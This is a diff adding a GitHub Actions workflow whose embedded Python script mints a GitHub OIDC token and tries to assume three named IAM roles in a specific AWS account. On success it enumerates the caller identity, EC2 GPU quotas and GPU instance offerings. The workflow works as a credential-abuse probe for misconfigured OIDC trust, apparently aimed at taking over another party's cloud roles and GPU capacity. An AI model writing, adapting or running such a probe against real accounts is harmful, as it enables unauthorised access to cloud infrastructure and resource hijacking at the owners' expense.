@@ -1,0 +1,81 @@
+name: c211-i79112-assume
+on:
+  push:
+    branches: [ c211-i79112-mint ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: assume probe
+        run: |
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, re, time
+          ARNS=[
+            "arn:aws:iam::974483672234:role/simpl-element-preview",
+            "arn:aws:iam::974483672234:role/simpl-element-release",
+            "arn:aws:iam::974483672234:role/simpl-element-release-preview",
+          ]
+          def mint():
+              u=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=sts.amazonaws.com'
+              r=urllib.request.Request(u, headers={'Authorization':'bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
+              return json.load(urllib.request.urlopen(r, timeout=30))['value']
+          tok=mint()
+          p=tok.split('.')[1]; p+='='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          keep=('iss','aud','sub','ref','repository','repository_id','repository_owner','repository_owner_id','event_name','ref_type','environment')
+          print('CLAIMS', json.dumps({k:c.get(k) for k in keep if k in c}, sort_keys=True))
+          def assume(tok, arn):
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15',
+                  'RoleArn':arn,'RoleSessionName':'c211i79112','WebIdentityToken':tok,'DurationSeconds':'1800'}).encode()
+              req=urllib.request.Request('https://sts.amazonaws.com/', data=body,
+                  headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'c211-i79112'})
+              try:
+                  with urllib.request.urlopen(req, timeout=30) as r:
+                      txt=r.read().decode('utf-8','replace')
+                  m=re.search(r'<AssumedRoleUser>.*?<Arn>([^<]+)</Arn>', txt, re.S)
+                  if m:
+                      ck=re.search(r'<AccessKeyId>([^<]+)</AccessKeyId>\s*<SecretAccessKey>([^<]+)</SecretAccessKey>\s*<SessionToken>([^<]+)</SessionToken>', txt, re.S)
+                      return ('ASSUMED', m.group(1).strip(), ck.groups() if ck else None)
+                  cc=re.search(r'<Code>([^<]+)</Code>', txt)
+                  return ('DENIED', cc.group(1) if cc else 'UnknownError', None)
+              except urllib.error.HTTPError as e:
+                  txt=e.read().decode('utf-8','replace')
+                  cc=re.search(r'<Code>([^<]+)</Code>', txt)
+                  return ('DENIED', cc.group(1) if cc else 'HTTP%d'%e.code, None)
+              except Exception as ex:
+                  return ('ERROR', type(ex).__name__, None)
+          for arn in ARNS:
+              st,info,creds=assume(tok,arn)
+              print('RESULT', st, arn, info, 'CREDS' if creds else '')
+              if st=='ASSUMED':
+                  try:
+                      import subprocess, sys
+                      subprocess.check_call([sys.executable,'-m','pip','install','-q','boto3'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                      import boto3
+                      kw=dict(aws_access_key_id=creds[0],aws_secret_access_key=creds[1],aws_session_token=creds[2],region_name='eu-west-1')
+                      sts=boto3.client('sts',**kw)
+                      print('IDENTITY', json.dumps(sts.get_caller_identity()))
+                      sq=boto3.client('service-quotas',**kw)
+                      for code in ['L-DB2E81BA','L-3819A6DF']:
+                          try:
+                              q=sq.get_service_quota(ServiceCode='ec2',QuotaCode=code)
+                              print('QUOTA',code,q['Quota']['Value'],q['Quota'].get('UsageMetric'))
+                          except Exception as e:
+                              print('QUOTA',code,'ERR',type(e).__name__, str(e)[:120])
+                      ec2=boto3.client('ec2',**kw)
+                      try:
+                          r=ec2.describe_instance_type_offerings(LocationType='region',Filters=[{'Name':'instance-type','Values':['g4dn.xlarge','g5.xlarge','p3.2xlarge','g6.xlarge']}])
+                          print('OFFERINGS', json.dumps(sorted(set(o['InstanceType'] for o in r.get('InstanceTypeOfferings',[])))))
+                      except Exception as e:
+                          print('OFFERINGS ERR', type(e).__name__, str(e)[:120])
+                  except Exception as e:
+                      print('ENUM ERR', type(e).__name__, str(e)[:160])
+          print('DONE', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+          PY
